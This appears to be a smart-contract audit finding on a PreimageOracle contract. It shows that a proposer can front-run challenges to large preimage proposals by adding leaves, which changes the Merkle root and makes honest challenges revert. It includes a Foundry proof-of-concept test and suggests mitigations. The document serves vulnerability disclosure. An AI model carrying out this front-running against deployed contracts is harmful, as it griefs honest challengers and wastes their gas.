```

Because the Merkle proofs are checked against the current `root` of the tree, any change made to the tree will consequently change the `root` and invalidate the submitted proofs.

This creates the opportunity to frontrun a `challengeLPP` or `challengeFirstLPP` call with an `addLeavesLPP` call, that will effectively cause the challenges to fail.

While adding leaves (and therefore this DoS scenario) is only possible as long as the LPP is not finalized, it's important to note that the current LPP challenge economic model (the first to challenge gets the reward) incentivizes early challenges, so it's very reasonable, if not likely, that honest parties will actually challenge incorrect LPPs before their finalization.

Malicious parties can then create an LPP with incorrect data and grief honest participants of the gas costs of challenging the proposal as many times as there can be leaves for the proposal.

## Impact
LPP challenges made to proposals that are not finalized yet can be DoS'ed if the proposer frontruns the challenge with a leaf addition. This can be exploited to grief honest challengers.

This impact on availability is only temporary, because as soon as LPP are finalized, challenges are no longer vulnerable to this attack.

## Proof of Concept
The following PoC shows how an `addLeavesLPP` call can cause the failure of a subsequent challenge that would otherwise succeed.

<details>
  <summary>Coded PoC (Foundry)</summary>

```Solidity
    // Add this to the PreimageOracle_LargePreimageProposals_Test test contract
    // in PreimageOracle.t.sol
    function testChallengeFrontrun() public {
        bytes memory data = new bytes(136 * 2);
        for (uint256 i; i < data.length; i++) {
            data[i] = 0xFF;
        }
        bytes memory phonyData = new bytes(136 * 2);

        // Initialize the proposal
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 0, uint32(data.length));

        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);

        uint256 midPoint = stateCommitments.length / 2;
        bytes32[] memory commitmentsA = new bytes32[](midPoint);
        bytes32[] memory commitmentsB = new bytes32[](midPoint);

        for (uint256 i = 0; i < midPoint; i++) {
            commitmentsA[i] = stateCommitments[i];
            commitmentsB[i] = stateCommitments[i + midPoint];
        }

        // A dishonest participant inserts leaves with phony data
        oracle.addLeavesLPP(TEST_UUID, 0, Bytes.slice(phonyData, 0, 136), commitmentsA, false);

        // An honest participant prepares to challenge
        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, phonyData);
        leaves[0].stateCommitment = stateCommitments[0];
        leaves[1].stateCommitment = stateCommitments[1];
        leaves[2].stateCommitment = stateCommitments[2];

        bytes32[] memory preProof = new bytes32[](16);
        for (uint256 i = 0; i < preProof.length; i++) {
            bytes32 zeroHash = oracle.zeroHashes(i);
            preProof[i] = zeroHash;
        }

        // ☢️ The dishonest participant front-runs the challenge by inserting one more leaf
        oracle.addLeavesLPP(TEST_UUID, 1, Bytes.slice(phonyData, 136, 136), commitmentsB, false);

        // 🚨 The honest participant's challenge goes rejected. 
        // Without the previous leaf addition, it would have succeeded
        vm.expectRevert(bytes(hex"09bde339")); // InvalidProof()
        oracle.challengeFirstLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _postState: leaves[0],
            _postStateProof: preProof
        });
    }
```

</details>

## Tools Used
Code review, Foundry

## Recommended Mitigation Steps
There are two possible mitigations to this vulnerability:
- if the project deliberately allowed challenging LPPs before finalizations, this issue could be fixed by:
  - having PreimageOracle keep track all past Merkle roots
  - and allowing challenges to provide proof of inclusion within any of these, instead of just the current one
- if, instead, challenging LPPs before finalizations is unintended, it should just be disallowed



